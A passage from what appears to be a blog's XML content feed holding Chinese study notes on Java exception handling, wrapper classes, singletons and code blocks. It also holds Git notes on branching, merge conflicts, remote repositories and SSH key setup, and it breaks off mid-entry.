class="comment">//处理异常类型1</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">2</span> 变量<span class="number">2</span>)&#123;</span><br><span class="line"><span class="comment">//处理异常类型2</span></span><br><span class="line">&#125;.....</span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line"><span class="comment">//一定会执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><p>使用try将可能出现异常代码包装起来，在执行的过程中一旦出现异常，就会生成一个对应异常类的对象，根据此对象的类型，在catch中进行匹配。进入catch后，进行异常的处理，处理完成后，就会跳出结构（在没有写finally情况下），继续执行后面代码。</p><p>在try-catch结构中申明的变量，在出了结构以后，就不可以再使用了。</p><p>使用<code>try-catch</code>处理异常时，可以使得编译时的错误延迟到运行时再出现。</p><p><code>catch</code>可以写多个。<code>finally</code>是可选的，不一定要写。</p><p><strong>try-catch基础例子：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">   <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> Integer.parseInt(str);</span><br><span class="line">   System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">   System.out.println(<span class="string">&quot;NumberFormatException&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * output:</span></span><br><span class="line"><span class="comment"> * NumberFormatException</span></span><br><span class="line"><span class="comment"> * 2</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>由于<code>System.out.println(&quot;1&quot;);</code>是位于异常后面，因此在抛出异常后，发生异常之后的代码将不会执行。</p><h4 id="throws方式">throws方式</h4><p><code>throws</code>给我个人的感觉与抽象类有点相似，<code>throws</code>就是在这个方法里我先不处理，谁调用了这个方法就由谁进行处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      test();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">   <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line">   <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">   <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> fis.read();</span><br><span class="line">   <span class="keyword">while</span> (data != -<span class="number">1</span>) &#123;</span><br><span class="line">      System.out.print((<span class="type">char</span>) data);</span><br><span class="line">      data = fis.read();</span><br><span class="line">   &#125;</span><br><span class="line">   fis.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="如何选择处理方式">如何选择处理方式</h4><ol><li>如果父类中被重写的方法没有throws处理异常，则子类重写的方法如果出现异常，就只能使用try-catch-finally进行处理；</li><li>在执行的方法A中，如果需要先后调用几个具有递进关系的方法，则这几个方法使用throw的方式处理，而A方法使用try-catch-finally的方式处理；</li><li>注意：子类重写的方法抛出的异常类型不大于父类被重写方法抛出的异常类型。</li></ol><h3 id="手动抛出异常">手动抛出异常</h3><p>异常对象可以通过跟一般对象一样，通过<code>new</code>生成异常对象。</p><p>通过<code>throw</code>关键词，我们可以将异常对象抛出。注意此处为<code>throw</code>，并非<code>throws</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(id &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">this</span>.id = id;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;id must be greater than 0&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自定义异常">自定义异常</h3><p>下面是自定义的步骤</p><ol><li>自定义异常类一般我们先会让我们自定义的类继承现有的异常体系（Exception、RuntimeException）；</li><li>定义全局常量<code>serialVersionUID</code>（对类的唯一标识）；</li><li>提供重载的构造器。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NewException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">NewException</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">NewException</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>(msg);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记零碎补充（2）：包装类、单例、代码块</title>
      <link href="/2022/04/29/Java%E7%AC%94%E8%AE%B0%E9%9B%B6%E7%A2%8E%E8%A1%A5%E5%85%85%EF%BC%882%EF%BC%89%EF%BC%9A%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E5%8D%95%E4%BE%8B%E3%80%81%E4%BB%A3%E7%A0%81%E5%9D%97/"/>
      <url>/2022/04/29/Java%E7%AC%94%E8%AE%B0%E9%9B%B6%E7%A2%8E%E8%A1%A5%E5%85%85%EF%BC%882%EF%BC%89%EF%BC%9A%E5%8C%85%E8%A3%85%E7%B1%BB%E3%80%81%E5%8D%95%E4%BE%8B%E3%80%81%E4%BB%A3%E7%A0%81%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h2 id="包装类">包装类</h2><p>包装类是针对八种基本数据类型定义相应的引用类型。</p><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Lnteger</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>boolean</td><td>Boolean</td></tr><tr><td>char</td><td>Character</td></tr></tbody></table><p>其中<code>Byte  Short  Lnteger  Long  Float  Double</code>拥有一个父类<code>Number</code>。</p><p>包装类的出现，使得基本数据类型可以封装起来，作为一个类使用，完善了Java面向对象的特性。</p><h3 id="包装类-基本数据类型-string相互转换">包装类、基本数据类型、String相互转换</h3><p><strong>使用构造器将基本数据类型装箱</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line">System.out.println(i1.toString());<span class="comment">//out:1</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">System.out.println(i2.toString());<span class="comment">//out:1</span></span><br><span class="line"><span class="type">Boolean</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="string">&quot;true123&quot;</span>);</span><br><span class="line">System.out.println(b2.toString());<span class="comment">//out:false</span></span><br><span class="line"><span class="comment">//Java在将布尔类型装箱时，如果不是null或者true，一律均未false</span></span><br><span class="line"><span class="comment">//布尔作为基本数据类型的时候，初值为false，作为包装类的时候，初值为null</span></span><br></pre></td></tr></table></figure><p><strong>使用包装类内置方法转换为基本数据类型</strong></p><p>包装类拥有一个<code>xxxValue</code>的方法，<code>xxx</code>是指要转换的类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> i.intValue();</span><br><span class="line">System.out.println(i1);</span><br></pre></td></tr></table></figure><p><strong>自动装箱与自动拆箱</strong></p><p>这是包装类与基本数据类型之间最常用的转换方式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   <span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">114514</span>;</span><br><span class="line">   Test(i1);<span class="comment">//自动装箱</span></span><br><span class="line">   <span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> i1;<span class="comment">//自动装箱</span></span><br><span class="line">   <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i2;<span class="comment">//自动拆箱</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Test</span><span class="params">(Object obj)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="包装类-基本数据类型与string之间的转换">包装类、基本数据类型与String之间的转换</h3><p><strong>包装类、基本数据类型–&gt;String</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">114514</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> i1 + <span class="string">&quot;&quot;</span>;<span class="comment">//方式一</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> String.valueOf(i1);<span class="comment">//方式二</span></span><br></pre></td></tr></table></figure><p><strong>String–&gt;包装类、基本数据类型</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;114514&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> Integer.parseInt(str1);<span class="comment">//包装类的parseXxx方法</span></span><br></pre></td></tr></table></figure><h2 id="单例设计模式">单例设计模式</h2><p>单例的设计模式就是让某一个类只能存在一个对象实例，并且这个类只提供一个取得其对象实例的方法。</p><p>具体就是将类的<strong>构造器访问权限设置为<code>private</code></strong>，这样类的外部就无法访问到类的构造器，但我们可以在<strong>类的内部产生类的对象</strong>。由于在类的外部，我们无法得到类的对象，只能通过<strong>该类的某个静态方法</strong>返回类内部构建的对象，由于静态方法只能访问静态成员变量，所以，指向类内部产生的<strong>对象的变量也必须是静态的</strong>。</p><p>单例有两种实现的方式——饿汉式与懒汉式。</p><h3 id="饿汉式实现">饿汉式实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Singleton</span> <span class="variable">singleton</span> <span class="operator">=</span> Singleton.getInstance();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">   <span class="comment">//1.私有化类的构造器</span></span><br><span class="line">   <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">   <span class="comment">//2.内部创建类的对象，并将其设置为静态</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">   <span class="comment">//3.提供公共的静态的方法，返回类的对象</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="懒汉式实现">懒汉式实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">   <span class="comment">//1.初始化类的构造器</span></span><br><span class="line">   <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">   <span class="comment">//2.声明一个静态类对象，但不进行初始化</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">   <span class="comment">//3.声明一个公共、静态的方法，返回当前类的对象</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (instance == <span class="literal">null</span>)&#123;<span class="comment">//防止创建多个对象</span></span><br><span class="line">         instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> instance;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单例的使用">单例的使用</h3><p>当一个实例生成需要使用大量资源的时候，使用单例可以节约系统性能的开销。单例模式应用场景其实挺常见的：</p><ul><li>应用程序的日志</li><li>网站计数器</li><li>数据库连接池</li><li>读取配置文件的类</li><li>Windows的回收站</li><li>…</li></ul><h2 id="代码块">代码块</h2><p>代码块在Java中指的是使用<code>&#123;&#125;</code>包围起来的代码集合。代码块分为四种，普通代码块，静态代码块，同步代码块，构造代码块。后面三种代码块均为类的成员之一。由于同步的内容还未学习，所以同步代码块的内容暂时不写。</p><h3 id="普通代码块">普通代码块</h3><p>普通代码块就是在方法体内定义的代码块，普通代码块和一般代码的执行顺序与书写顺序一致。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">   &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;普通代码块&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="静态代码块">静态代码块</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态代码块在类被加载的时候会被执行，而且只执行一次，并且优先于各种代码块以及构造函数。如果类中含有多个代码块，则会按照代码顺序执行。</p><p>由于静态代码块的加载是优先于类的其他成员的，所以他既不能存在任何方法体中，也不能访问任何普通变量。</p><p>静态代码块用于某些代码需要启动时就执行，例如启动时加载配置文件等。</p><h3 id="构造代码块">构造代码块</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造代码块与静态代码块在外观上差距了一个<code>static</code>关键词。</p><p>构造代码块在创建对象时会被调用，每次创建对象时都会调用依次，且执行顺序是优先于构造函数的。实际上，构造代码块是依托于构造函数的，在编译后，构造代码块就是将里面的代码置入构造函数的最前端。</p><p>由于构造代码块每次创建对象都会执行，而构造函数不一定每个对象构造的时候都执行（多个构造函数情况下，建立对象时传入的参数不同则初始化使用对应的构造函数），利用这个特性，我们可以做统计对象创建次数等功能。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git入门笔记（3）：分支管理</title>
      <link href="/2022/04/24/Git%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/"/>
      <url>/2022/04/24/Git%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%EF%BC%9A%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="git入门笔记-三">Git入门笔记（三）</h2><h3 id="分支管理">分支管理</h3><p>分支管理是Git中非常重要的管理，使用分支可以使你在开发主线中分离出来，在不影响开发主线的情况下继续工作，例如开发测试版、测试功能之类的。接下来介绍几个基础操作。</p><h4 id="创建分支">创建分支</h4><p>现在我们需要创建一个叫<code>test</code>的分支，并切换至分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b test</span><br></pre></td></tr></table></figure><p>实际上这是两条命令的简写：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch test</span><br><span class="line">git checkout test</span><br></pre></td></tr></table></figure><p>第一条命令，代表创建一个<code>test</code>分支；</p><p>第二个命令，代表切换到<code>test</code>分支。</p><h4 id="查看所有分支">查看所有分支</h4><p>我们使用不带任何参数的<code>git branch</code>命令即可查看所有分支，并且该命令会将当前分支用<code>*</code>号标注出来。</p><p><img src="https://image.icewindy.cn/202204262039070.png" alt="image-20220426203906050"></p><h4 id="删除分支">删除分支</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d test</span><br></pre></td></tr></table></figure><p>这样我们就删除了<code>test</code>分支了。如果<code>test</code>分支包含我们未合并到分支的更改，它会报出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error: The branch &#x27;test&#x27; is not fully merged.</span><br><span class="line">If you are sure you want to delete it, run &#x27;git branch -D test&#x27;.</span><br></pre></td></tr></table></figure><p>此时，我们如果的的确确不想要这些更改了，我们就按照错误信息中的操作，使用<code>-D</code>强制将它删除即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -D test</span><br></pre></td></tr></table></figure><h4 id="分支合并">分支合并</h4><p>分支出来的往往是测试的分支，我们需要将他合并会主分区。</p><p>首先，我们切换会主分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout main</span><br></pre></td></tr></table></figure><p>接着我们使用合并指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge test</span><br></pre></td></tr></table></figure><p>合并完成后我们就可以删除分支了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d test</span><br></pre></td></tr></table></figure><h4 id="合并冲突">合并冲突</h4><p>合并分支肯定会出现两边在同一处地方不同修改的问题，这时，我们就需要去解决冲突。</p><p>我们现在在分支下修改一个文件，然后我再在主分支下修改同一文件，使得分支与主分支的文件不同。</p><p>当我们运行合并分支指令<code>git merge test</code>，它会报出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Auto-merging git.md</span><br><span class="line">CONFLICT (content): Merge conflict in git.md</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><p><code>git.md</code>自动合并失败了，我们需要去手动解决合并错误。这时，我们通过任何一种文本的方式打开我们冲突的文件<code>git.md</code>，Git会将冲突的地方帮我我们标注出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">First.Third.</span><br><span class="line">=======</span><br><span class="line">First.Second.</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; test</span><br></pre></td></tr></table></figure><p><code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</code>表示当前分支；</p><p><code>=======</code>是分割线；</p><p><code>&gt;&gt;&gt;&gt;&gt;&gt;&gt; test</code>表示Test分支。</p><p>接下来，我们根据实际情况，保留我们需要的部分，将文件进行修改，这里我们演示将两个部分合并：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">First.Third.</span><br><span class="line">First.Second.</span><br></pre></td></tr></table></figure><p>解决冲突内容后，我们使用提交到本地库的操作，将修改后的文件提交：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add .\git.md</span><br><span class="line">git commit -m &#x27;主干分支冲突解决&#x27;</span><br></pre></td></tr></table></figure><p>这时，我们就解决了合并冲突了。最后我们可以将不需要的分支删除：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d test</span><br></pre></td></tr></table></figure><p>我们的本地分支合并工作就完成了。</p>]]></content>
      
      
      <categories>
          
          <category> 实用技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git入门笔记（2）：远程仓库</title>
      <link href="/2022/04/22/Git%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/"/>
      <url>/2022/04/22/Git%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%EF%BC%9A%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="git入门笔记-二">Git入门笔记（二）</h2><h3 id="远程仓库">远程仓库</h3><h4 id="克隆项目到本地">克隆项目到本地</h4><p>很简单，<code>git clone &lt;url&gt;</code>在url填入远程仓库的地址就可以clone到本地了，url处有两种地址，一种是通过SSH进行克隆，另外一种是通过HTTPS的方式进行克隆。</p><img src="https://image.icewindy.cn/202204221855787.png" alt="image-20220422185525713" style="zoom:67%;" /><p>上面为SSH的方式，下面为HTTPS的方式。</p><h4 id="初始化远程仓库">初始化远程仓库</h4><h5 id="https">HTTPS</h5><p>以GitHub为例子，具体账号与仓库创建不再赘述。</p><p>仓库创建好了之后，我们看到我们的仓库是没有初始化的，GitHub页面上会出现一个初始化的教程。</p><img src="https://image.icewindy.cn/202204222053081.png" alt="image-20220422205301003" style="zoom: 33%;" /><p>我们照着教程上初始化即可，简单来说，它的初始化过程就是，先生成一个<code>README.md</code>，接着创建一个本地仓库，提交<code>README.md</code>到本地仓库，然后将本地仓库推送到远程仓库，即可完成初始化。</p><img src="https://image.icewindy.cn/202204222103895.png" alt="image-20220422210303739" style="zoom: 40%;" /><h5 id="配置ssh">配置SSH</h5><p>Git支持多种协议，其中包括SSH，SSH速度相当不错，比HTTPS效果更佳。我们来配置一下SSH。</p><p>第一步，我们检查一下电脑上是否已经存在<code>SSH Key</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>如果显示出存在<code>id_rsa.pub</code>或<code> id_dsa.pub</code>文件时，则证明已经存在<code>SSH Key</code>，可以跳过第二步。</p><p>第二步，创建<code>SSH Key</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C &quot;your_email@example.com&quot;</span><br></pre></td></tr></table></figure><p>如果你的电脑不支持<code>ed25519</code>的加密格式，我们也可以使用传统的<code>rsa</code>加密：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;</span><br></pre></td></tr></table></figure><p>我们可以来看看参数的含义：</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>-b</td><td>指定密钥长度</td></tr><tr><td>-e</td><td>读取openssh的私钥或者公钥文件</td></tr><tr><td>-f</td><td>指定用于保存密钥的文件名</td></tr><tr><td>-t</td><td>指定密钥类型</td></tr><tr><td>-C</td><td>添加注释，往往以邮箱作为注释</td></tr></tbody></table><p>通常的，我们可以省略<code>-b</code>参数。<code>-f</code>参数会在后面提示中让你填写：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/c/Users/yourusersname/.ssh/id_rsa): [Press enter]</span></span><br></pre></td></tr></table></figure><p>这里推荐使用默认即可，接着会提醒是输入两次密码，此密码为push时使用的密码，不是GitHub的密码，我们可以不输入，这样在push时就不需要密码了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 